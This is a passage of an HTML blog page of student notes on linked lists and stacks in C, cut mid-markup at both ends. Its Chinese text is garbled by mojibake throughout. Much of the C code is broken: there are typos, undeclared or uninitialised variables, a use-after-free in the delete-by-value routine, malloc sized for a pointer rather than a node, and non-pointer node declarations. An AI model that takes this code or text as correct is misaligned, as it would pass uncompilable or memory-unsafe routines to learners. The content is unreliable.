href="#æŒ‰ç…§åºå·æŸ¥æ‰¾" class="headerlink" title="æŒ‰ç…§åºå·æŸ¥æ‰¾"></a>æŒ‰ç…§åºå·æŸ¥æ‰¾</h4><p>æ‰¾é“¾è¡¨ä¸­ç¬¬<code>i</code>ä¸ªç»“ç‚¹ï¼Œæ‰¾åˆ°çš„è¯ï¼Œè¿”å›è¯¥ç»“ç‚¹çš„<code>å­˜å‚¨ä½ç½®</code>ï¼Œå¦åˆ™è¿”å›<code>NULL</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">PNode <span class="title function_">Locate_Link2</span><span class="params">(Linklist llist,<span class="type">int</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">    PNode p;</span><br><span class="line">    <span class="type">int</span> flag;</span><br><span class="line">    <span class="keyword">if</span>(llist == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    p = llist-&gt;next;</span><br><span class="line">    <span class="keyword">while</span>(p!=<span class="literal">NULL</span>&amp;&amp;flag!=x)</span><br><span class="line">    &#123;</span><br><span class="line">        p=p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å•é“¾è¡¨æ’å…¥"><a href="#å•é“¾è¡¨æ’å…¥" class="headerlink" title="å•é“¾è¡¨æ’å…¥"></a>å•é“¾è¡¨æ’å…¥</h3><h4 id="åæ’æ³•"><a href="#åæ’æ³•" class="headerlink" title="åæ’æ³•"></a>åæ’æ³•</h4><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201209192825.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//åœ¨é“¾è¡¨llistä¸­çš„pä½ç½®ä¹‹åæ’å…¥å€¼ä¸ºxçš„ç»“ç‚¹</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">InsertPost_link</span><span class="params">(LinkList llist,PNode p,DataType x)</span></span><br><span class="line">&#123;</span><br><span class="line">    PNode q;</span><br><span class="line">    <span class="keyword">if</span>(p == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;data don&#x27;t exist&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    q = (PNode)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Node));</span><br><span class="line">    <span class="keyword">if</span>(q != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        q-&gt;data = x;</span><br><span class="line">        q-&gt;next = p-&gt;next;</span><br><span class="line">        p-&gt;next = q;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;malloc å¤±è´¥\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="å‰æ’æ³•"><a href="#å‰æ’æ³•" class="headerlink" title="å‰æ’æ³•"></a>å‰æ’æ³•</h4><blockquote><p><strong>å‰æ’æ³•é¦–å…ˆè¦æ‰¾åˆ°pçš„å‰é©±ç»“ç‚¹preï¼Œç„¶åè½¬åŒ–ä¸ºåæ’æ³•æ¥æ’å…¥</strong></p></blockquote><p><img src="https://raw.githubusercontent.com/C1everF0x/Images/master/20200930100744.png" alt="æ­¥éª¤"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">InsertPre_link</span><span class="params">(LinkList llist.PNode p,DataType x)</span></span><br><span class="line">&#123;</span><br><span class="line">    Pnode prt = llist;</span><br><span class="line">    PNode q = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">while</span>(pre-&gt;next != p)</span><br><span class="line">    &#123;</span><br><span class="line">        pre = pre-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    q = (PNode)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Node));</span><br><span class="line">    <span class="keyword">if</span>(q ==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    q-&gt;data = x;</span><br><span class="line">    q-&gt;next = p;</span><br><span class="line">    pre-&gt;next = q;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å•é“¾è¡¨åˆ é™¤"><a href="#å•é“¾è¡¨åˆ é™¤" class="headerlink" title="å•é“¾è¡¨åˆ é™¤"></a>å•é“¾è¡¨åˆ é™¤</h3><h4 id="åˆ é™¤ç»“ç‚¹çš„åç»§"><a href="#åˆ é™¤ç»“ç‚¹çš„åç»§" class="headerlink" title="åˆ é™¤ç»“ç‚¹çš„åç»§"></a>åˆ é™¤ç»“ç‚¹çš„åç»§</h4><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201209193833.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">DelPostionNext_Link</span><span class="params">(LinkList head,PNode r)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(r-&gt;next)</span><br><span class="line">    &#123;</span><br><span class="line">        PNode p = r-&gt;next;</span><br><span class="line">    r-&gt;next = p-&gt;next;</span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="åˆ é™¤ç»“ç‚¹æœ¬èº«"><a href="#åˆ é™¤ç»“ç‚¹æœ¬èº«" class="headerlink" title="åˆ é™¤ç»“ç‚¹æœ¬èº«"></a>åˆ é™¤ç»“ç‚¹æœ¬èº«</h4><blockquote><p>åˆ é™¤ç»“ç‚¹æœ¬èº«éœ€è¦å…ˆæ‰¾åˆ°ç»“ç‚¹çš„å‰é©±ï¼Œç„¶åè½¬åŒ–ä¸ºåˆ é™¤ç»“ç‚¹çš„åç»§æ¥åš</p></blockquote><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201209193938.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">DelPostion_Link</span><span class="params">(LinkList head,PNode r)</span></span><br><span class="line">&#123;</span><br><span class="line">PNode  pre = head; </span><br><span class="line"><span class="keyword">while</span>(pre-&gt;next != r)</span><br><span class="line">    &#123;</span><br><span class="line">        pre = pre-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    pre-&gt;next = r-&gt;next;</span><br><span class="line">    <span class="built_in">free</span>(r);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="æŒ‰å€¼åˆ é™¤"><a href="#æŒ‰å€¼åˆ é™¤" class="headerlink" title="æŒ‰å€¼åˆ é™¤"></a>æŒ‰å€¼åˆ é™¤</h4><blockquote><p>æŒ‰å€¼åˆ é™¤çš„åŸç†å°±æ˜¯ç”¨ä¸¤ä¸ªæŒ‡é’ˆä¸€å‰ä¸€åéå†é“¾è¡¨ï¼Œåé¢çš„æŒ‡é’ˆæ‰¾åˆ°è¦åˆ é™¤ç»“ç‚¹ä¹‹åæŠŠæŒ‡é’ˆåŸŸèµ‹å€¼ç»™å‰ä¸€ä¸ªæŒ‡é’ˆçš„æŒ‡é’ˆåŸŸï¼Œç„¶åè‡ªæˆ‘é‡Šæ”¾ï¼ŒåŸç†ç­‰åŒäºåˆ é™¤è‡ªèº«ç»“ç‚¹çš„ç®—æ³•</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//åˆ é™¤ç¬¬ä¸€ä¸ªä¸è¾“å…¥å‚æ•°dataç›¸ç­‰çš„å€¼çš„ç»“ç‚¹</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">DelValue_Link</span><span class="params">(LinkList head,<span class="type">int</span> data)</span></span><br><span class="line">&#123;</span><br><span class="line">    PNode p = head-&gt;next;</span><br><span class="line">    PNode before_p = head;</span><br><span class="line">    <span class="keyword">while</span>(p != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;data == data)</span><br><span class="line">        &#123;</span><br><span class="line">            before_p-&gt;next = p-&gt;next;</span><br><span class="line">            <span class="built_in">free</span>(p);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            p = p-&gt;next;</span><br><span class="line">            before_p = before_p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å•é“¾è¡¨é€†ç½®"><a href="#å•é“¾è¡¨é€†ç½®" class="headerlink" title="å•é“¾è¡¨é€†ç½®"></a>å•é“¾è¡¨é€†ç½®</h3><blockquote><p><strong>è¿™æ˜¯åœ¨è¯¾å ‚ä¸Šå½“å ‚ç»ƒä¹ çš„å†…å®¹ï¼Œè®°å½•ä¸‹æ¥ï¼Œç›´æ¥è´´ç®—æ³•å§</strong></p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">Reverse</span><span class="params">(LinkList H)</span></span><br><span class="line">&#123;</span><br><span class="line">    PNode a,b;</span><br><span class="line">    a = H-&gt;next;    <span class="comment">//ç”¨ä¸€ä¸ªæŒ‡é’ˆè®°å½•ä¸‹ç¬¬ä¸€ä¸ªç»“ç‚¹</span></span><br><span class="line">    H-&gt;next = <span class="literal">NULL</span>; <span class="comment">//å¤´ç»“ç‚¹æŒ‡é’ˆåŸŸç½®ç©ºï¼ŒæŠŠå¤´ç»“ç‚¹ç‹¬å‡ºæ¥</span></span><br><span class="line">    <span class="keyword">while</span>(a)        <span class="comment">//è¿›å…¥å¾ªç¯ï¼Œå¾ªç¯åˆ°æœ€åä¸€ä¸ªç»“ç‚¹ä¸ºNULLæ—¶ç»“æŸå¾ªç¯</span></span><br><span class="line">    &#123;</span><br><span class="line">        b = a;                  <span class="comment">//ç”¨å¦ä¸€ä¸ªæŒ‡é’ˆè®°å½•ä¸‹åç»§ç»“ç‚¹</span></span><br><span class="line">        a = a-&gt;next;            <span class="comment">//ç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªç»“ç‚¹</span></span><br><span class="line">        b-&gt;next = H-&gt;next;      <span class="comment">//å¤´ç»“ç‚¹æŒ‡é’ˆåŸŸæŒ‡å‘åˆ†ç¦»å‡ºæ¥çš„é‚£ä¸ªç»“ç‚¹</span></span><br><span class="line">        H-&gt;next = b;            <span class="comment">//ä¸æ‡‚æ€ä¹ˆè¡¨è¾¾è¿™å¥è¯çš„æ„æ€</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><del>å•å¾ªç¯é“¾è¡¨å’ŒåŒå¾ªç¯é“¾è¡¨è®°å¾—æ›´æ–°</del></p><p>å·²æ›´æ–°</p></blockquote><h3 id="å•å¾ªç¯é“¾è¡¨"><a href="#å•å¾ªç¯é“¾è¡¨" class="headerlink" title="å•å¾ªç¯é“¾è¡¨"></a>å•å¾ªç¯é“¾è¡¨</h3><p>ä¸ºäº†è§£å†³çŸ¥é“é“¾è¡¨ä¸­æŸä¸ªç»“ç‚¹çš„ä½ç½®è€Œæ— æ³•æ‰¾åˆ°å…¶å‰é©±çš„é—®é¢˜ï¼Œå¼•å…¥äº†å¾ªç¯é“¾è¡¨ï¼Œå°±æ˜¯<strong>è®©æœ€åä¸€ä¸ªç»“ç‚¹æŒ‡å‘å¤´ç»“ç‚¹</strong></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201209195611.png"></p><p>ä¸ºäº†æ–¹ä¾¿åˆ©ç”¨ï¼Œå¤šé‡‡ç”¨<strong>å°¾æŒ‡é’ˆ</strong><code>rear</code>æ¥è¡¨ç¤ºå•å¾ªç¯é“¾è¡¨ï¼Œå¤´ç»“ç‚¹åˆ™è¡¨ç¤ºä¸º<code>rear-&gt;next</code>ï¼Œç¬¬ä¸€ä¸ªç»“ç‚¹åˆ™è¡¨ç¤ºä¸º<code>rear-&gt;next-&gt;next</code></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201209195643.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//å»ºç«‹å°¾æŒ‡é’ˆè¡¨ç¤ºçš„å•å¾ªç¯é“¾è¡¨</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> DataType;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">PNode</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>&#123;</span></span><br><span class="line">    DataType data;</span><br><span class="line">    PNode next;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">CLinkList</span>;</span></span><br><span class="line">CLinkList <span class="title function_">createListRearCircle</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    PNode rear;</span><br><span class="line">    Pnode s;</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">    CLinkList head = (CLinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(CLinkList));</span><br><span class="line">    head-&gt;next = head;</span><br><span class="line">    rear = head;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;è¯·è¾“å…¥æ•´å‹æ•°æ®å»ºç«‹é“¾è¡¨ï¼Œä»¥-1ç»“æŸ\n&quot;</span>);</span><br><span class="line">    scanf_s(<span class="string">&quot;%d&quot;</span>&amp;x);</span><br><span class="line">    whlie(x!=<span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        s = (PNode)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(CLinkList));</span><br><span class="line">        s-&gt;data = x;</span><br><span class="line">        s-&gt;next = head;</span><br><span class="line">        rear-&gt;next = s;</span><br><span class="line">        rear = s;</span><br><span class="line">        scanf_s(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> rear;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="ä¸¤ä¸ªå•å¾ªç¯é“¾è¡¨åˆå¹¶æˆä¸€ä¸ªæ–°çš„å•å¾ªç¯é“¾è¡¨"><a href="#ä¸¤ä¸ªå•å¾ªç¯é“¾è¡¨åˆå¹¶æˆä¸€ä¸ªæ–°çš„å•å¾ªç¯é“¾è¡¨" class="headerlink" title="ä¸¤ä¸ªå•å¾ªç¯é“¾è¡¨åˆå¹¶æˆä¸€ä¸ªæ–°çš„å•å¾ªç¯é“¾è¡¨"></a>ä¸¤ä¸ªå•å¾ªç¯é“¾è¡¨åˆå¹¶æˆä¸€ä¸ªæ–°çš„å•å¾ªç¯é“¾è¡¨</h4><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201209202024.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">CLinkList <span class="title function_">Combine</span><span class="params">(CLinkList a,CLinkList b)</span></span><br><span class="line">&#123;</span><br><span class="line">    PNode p = a-&gt;next;</span><br><span class="line">    a-&gt;next = b-&gt;next-&gt;next;</span><br><span class="line">    <span class="built_in">free</span>(b-&gt;next);</span><br><span class="line">    b-&gt;next = p;</span><br><span class="line">    <span class="keyword">return</span> b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="åŒé“¾è¡¨å’ŒåŒå¾ªç¯é“¾è¡¨"><a href="#åŒé“¾è¡¨å’ŒåŒå¾ªç¯é“¾è¡¨" class="headerlink" title="åŒé“¾è¡¨å’ŒåŒå¾ªç¯é“¾è¡¨"></a>åŒé“¾è¡¨å’ŒåŒå¾ªç¯é“¾è¡¨</h3><h4 id="åŒé“¾è¡¨"><a href="#åŒé“¾è¡¨" class="headerlink" title="åŒé“¾è¡¨"></a>åŒé“¾è¡¨</h4><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201209202806.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ç±»å‹å®šä¹‰</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>//åŒé“¾è¡¨ç»“ç‚¹ç±»å‹</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    DataType data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">llink</span>;</span><span class="comment">//å‰é©±æŒ‡é’ˆ</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">rlink</span>;</span><span class="comment">//åç»§æŒ‡é’ˆ</span></span><br><span class="line">&#125;Dlnode;</span><br><span class="line"><span class="keyword">typedef</span><span class="comment">//å¤´å°¾ç»“ç‚¹æŒ‡é’ˆç±»å‹ï¼ˆheadï¼‰</span></span><br><span class="line">&#123;</span><br><span class="line">    DLnode *first;</span><br><span class="line">    DLnode *last;</span><br><span class="line">&#125;DLinkList;</span><br><span class="line">DLinkList *dlist;</span><br></pre></td></tr></table></figure><h4 id="åŒé“¾è¡¨åˆ é™¤"><a href="#åŒé“¾è¡¨åˆ é™¤" class="headerlink" title="åŒé“¾è¡¨åˆ é™¤"></a>åŒé“¾è¡¨åˆ é™¤</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">Del_DoubleList</span><span class="params">(DLinkList dlist,Dlnode *p)</span></span><br><span class="line">&#123;</span><br><span class="line">    p-&gt;llink-&gt;rlink = p-&gt;rlink;</span><br><span class="line">    p-&gt;rlink-&gt;llink = p-&gt;llink;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="åŒé“¾è¡¨æ’å…¥"><a href="#åŒé“¾è¡¨æ’å…¥" class="headerlink" title="åŒé“¾è¡¨æ’å…¥"></a>åŒé“¾è¡¨æ’å…¥</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">Insert_DoubleList</span><span class="params">(Dlnode *p)</span></span><br><span class="line">&#123;</span><br><span class="line">    Dlnode s = (Dlnode)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Dlnode));</span><br><span class="line">    <span class="keyword">if</span>(s)</span><br><span class="line">    &#123;</span><br><span class="line">        s-&gt;llink = p;</span><br><span class="line">        s-&gt;rlink = p-&gt;rlink;</span><br><span class="line">        p-&gt;rlink-&gt;llink = s;</span><br><span class="line">        p-&gt;rlink = s;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;mallocå¤±è´¥\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="åŒå¾ªç¯é“¾è¡¨"><a href="#åŒå¾ªç¯é“¾è¡¨" class="headerlink" title="åŒå¾ªç¯é“¾è¡¨"></a>åŒå¾ªç¯é“¾è¡¨</h4><blockquote><p>æŠŠåŒé“¾è¡¨æœ€åä¸€ä¸ªç»“ç‚¹çš„åç»§æŒ‡é’ˆæŒ‡å‘ç¬¬ä¸€ä¸ªç»“ç‚¹ï¼ŒæŠŠç¬¬ä¸€ä¸ªç»“ç‚¹çš„å‰é©±æŒ‡é’ˆæŒ‡å‘æœ€åä¸€ä¸ªç»“ç‚¹ï¼Œå°±ç»„æˆäº†åŒå¾ªç¯é“¾è¡¨</p></blockquote><h1 id="ç¬¬ä¸‰ç« -æ ˆå’Œé˜Ÿåˆ—"><a href="#ç¬¬ä¸‰ç« -æ ˆå’Œé˜Ÿåˆ—" class="headerlink" title="ç¬¬ä¸‰ç«  æ ˆå’Œé˜Ÿåˆ—"></a>ç¬¬ä¸‰ç«  æ ˆå’Œé˜Ÿåˆ—</h1><ul><li><strong>æ ˆå’Œé˜Ÿåˆ—å…¶å®æ˜¯çº¿æ€§è¡¨çš„ç‰¹ä¾‹ï¼Œç‰¹æ®Šæ€§åœ¨äºå®ƒä»¬éƒ½æ˜¯æ“ä½œå—é™çš„çº¿æ€§è¡¨</strong></li></ul><h2 id="æ ˆ"><a href="#æ ˆ" class="headerlink" title="æ ˆ"></a>æ ˆ</h2><ul><li>æ ˆé™å®šåœ¨è¡¨å°¾è¿›è¡Œæ’å…¥æˆ–åˆ é™¤ï¼Œè¡¨å°¾ç«¯ç§°<strong>æ ˆé¡¶</strong>ï¼Œè¡¨å¤´ç«¯ç§°<strong>æ ˆåº•</strong></li><li><strong>åè¿›å…ˆå‡º</strong></li></ul><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201210203545.png"></p><h3 id="æ ˆæ··æ´—"><a href="#æ ˆæ··æ´—" class="headerlink" title="æ ˆæ··æ´—"></a>æ ˆæ··æ´—</h3><ul><li>nä¸ªæ•°æ®ä»¥æ­¤è¿›æ ˆï¼Œéšæ—¶å¯èƒ½å‡ºæ ˆï¼ŒæŒ‰ç…§å‡ºæ ˆé¡ºåºå¾—åˆ°çš„ä¸€ä¸ªåºåˆ—ï¼Œç§°ä¸ºä¸€ä¸ªæ ˆæ··æ´—</li><li>ä»»ä¸€å‰ç¼€ä¸­çš„ push ä¸å°‘äº pop ï¼Œåˆ™è¯¥åºåˆ—ä¹Ÿå¿…ç„¶å¯¹åº”ä¸€ä¸ªæ ˆæ··æ´—</li></ul><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201013235541.png" alt="æ ˆæ··æ´—"></p><h3 id="é¡ºåºæ ˆ"><a href="#é¡ºåºæ ˆ" class="headerlink" title="é¡ºåºæ ˆ"></a>é¡ºåºæ ˆ</h3><ul><li><strong>é™æ€ç»“æ„ï¼Œéœ€æå‰åˆ†é…å­˜å‚¨ç©ºé—´</strong></li><li><strong>æ³¨æ„åˆ¤æ–­æ ˆæ»¡æˆ–æ ˆç©º</strong></li></ul><h4 id="é¡ºåºæ ˆç±»å‹å®šä¹‰"><a href="#é¡ºåºæ ˆç±»å‹å®šä¹‰" class="headerlink" title="é¡ºåºæ ˆç±»å‹å®šä¹‰"></a>é¡ºåºæ ˆç±»å‹å®šä¹‰</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> DataType;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Stack</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> MAX;<span class="comment">//æœ€å¤§å®¹é‡</span></span><br><span class="line">    <span class="type">int</span> top;<span class="comment">//æ ˆé¡¶æŒ‡é’ˆ</span></span><br><span class="line">    DataType *elem;<span class="comment">//å­˜æ”¾å…ƒç´ çš„æ•°ç»„çš„èµ·å§‹æŒ‡é’ˆ</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Stack</span> *<span class="title">SeqStack</span>//å®šä¹‰é¡ºåºæ ˆç±»å‹</span></span><br></pre></td></tr></table></figure><h4 id="åˆ›å»ºç©ºæ ˆ"><a href="#åˆ›å»ºç©ºæ ˆ" class="headerlink" title="åˆ›å»ºç©ºæ ˆ"></a>åˆ›å»ºç©ºæ ˆ</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">SeqStack <span class="title function_">SetNullStack_Seq</span><span class="params">(<span class="type">int</span> m)</span><span class="comment">//åˆ›å»ºç©ºé¡ºåºæ ˆï¼Œm ä¸ºåˆ†é…çš„æœ€å¤§ç©ºé—´</span></span><br><span class="line">&#123;</span><br><span class="line">    SeqStack sstack = (SeqStack)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Stack));</span><br><span class="line">    <span class="keyword">if</span>(sstack != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        sstack-&gt;elem = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>) * m);</span><br><span class="line">        <span 